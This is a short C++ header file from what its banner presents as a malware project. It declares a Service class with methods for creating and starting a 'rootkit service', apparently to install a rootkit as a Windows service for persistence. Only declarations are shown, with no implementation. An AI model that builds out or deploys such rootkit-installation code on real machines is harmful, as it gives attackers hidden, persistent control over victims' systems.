/*
##################################################
#                                                #
#         Malware Coder: Elliot Alderson         #
#                                                #
#   Github: https://github.com/ElliotAlderson51  #
#                                                #
##################################################
*/

#ifndef CREATESERVICE_H
#define CREATESERVICE_H

#include "Tools.h"

class Service : Tools
{
	BOOL CreateRootkitService(const std::string& serviceName, const std::string &binaryPath);
	BOOL StartServiceX(const std::string& serviceName);

public:
	Service();
};


#endif // !CREATESERVICE_H
